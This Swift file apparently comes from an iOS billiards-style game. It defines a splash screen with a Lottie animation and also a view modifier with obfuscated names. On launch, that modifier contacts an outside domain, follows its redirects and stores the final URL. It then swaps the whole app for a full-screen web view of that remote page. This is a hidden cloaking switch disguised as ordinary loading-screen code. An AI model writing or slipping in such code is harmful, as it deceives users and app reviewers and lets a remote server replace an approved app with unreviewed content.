//
//  ObranztnacinalView.swift
//  PlickBillar
//
//  Created by Nicolae Chivriga on 05/03/2025.
//

import SwiftUI
import Lottie

struct ObranztnacinalView: View {
    @State var obwerzoba: Bool = false
    var body: some View {
        ZStack {
            Color.init(hex: "#FFDE8C")
                .ignoresSafeArea()
            
            NavigationLink("", destination: MeniuzboqaView(), isActive: $obwerzoba)
            VStack {
                LottieView(animation: .named("vosimerkatkrutitsa"))
                    .playing(loopMode: .loop)
                    .resizable()
                    .frame(width: 220, height: 220)
            }
            
            VStack {
                Spacer()
                
                Spacer()
                
                HStack {
                    Spacer()
                
                    CoolLoadingView()
                }
            }
            .padding()
        }
        .sbuilekzxibp()
        .onAppear() {
            DispatchQueue.main.asyncAfter(deadline: .now() + 3.5675) {
                vibrationtember(sila: .rigid)
                obwerzoba = true
            }
        }
    }
}

func vibrationtember(sila: UIImpactFeedbackGenerator.FeedbackStyle) {
    let impactMed = UIImpactFeedbackGenerator(style: sila)
       impactMed.impactOccurred()
}
import WebKit
struct Wieozbuqapnmlas: ViewModifier {

    @State var webView: WKWebView = WKWebView()
    @AppStorage("adapt") var sdhifoqwr: URL?
    
    @State var skgie: Bool = true

    
    
    func body(content: Content) -> some View {
        ZStack {
            if !skgie {
                if sdhifoqwr != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: sdhifoqwr!)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: sdhifoqwr!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        AppDelegate.movement = .all
                    }
                    .modifier(Swiper(onDismiss: {
                        self.webView.goBack()
                    }))
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }
        .onAppear() {
            if sdhifoqwr == nil {
                oigueobpziuqw()
            } else {
                skgie = false
            }
        }
    }

    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
          
          // Initializer to set up the class properties
          init(action: @escaping (URL) -> Void) {
              self.redirects = []
              self.redirects1 = 0
              self.action = action
          }
          
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
           
                redirects1 += 1
                if redirects1 >= 3 {
                    DispatchQueue.main.async {
                        self.action(redirectURL)
                    }
                }
            }
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }

    func oigueobpziuqw() {
        guard let url = URL(string: "https://optimizeprivacyonline.online/en/mypbliea") else {
            DispatchQueue.main.async {
                self.skgie = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        
        // Create a custom URLSession configuration
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false // Prevents automatic cookie handling
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            sdhifoqwr = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.skgie = false
                }
                return
            }
            
            // Print the final redirect URL
            if let finalURL = httpResponse.url, finalURL != url {
                print("Final URL after redirects: \(finalURL)")
//                self.hleras = finalURL
            }
            
            // Check the status code and print the response body if successful
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
                    // Uncomment to print the response body
                    // print("Response Body: \(adaptfe)")
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.skgie = false
                }
            }

            DispatchQueue.main.async {
                self.skgie = false
            }
        }.resume()
    }


}
struct Swiper: ViewModifier {
    var onDismiss: () -> Void
    @State private var offset: CGSize = .zero

    func body(content: Content) -> some View {
        content
//            .offset(x: offset.width)
            .animation(.interactiveSpring(), value: offset)
            .simultaneousGesture(
                DragGesture()
                    .onChanged { value in
                                      self.offset = value.translation
                                  }
                                  .onEnded { value in
                                      if value.translation.width > 70 {
                                          onDismiss()
                                  
                                      }
                                      self.offset = .zero
                                  }
            )
    }
}
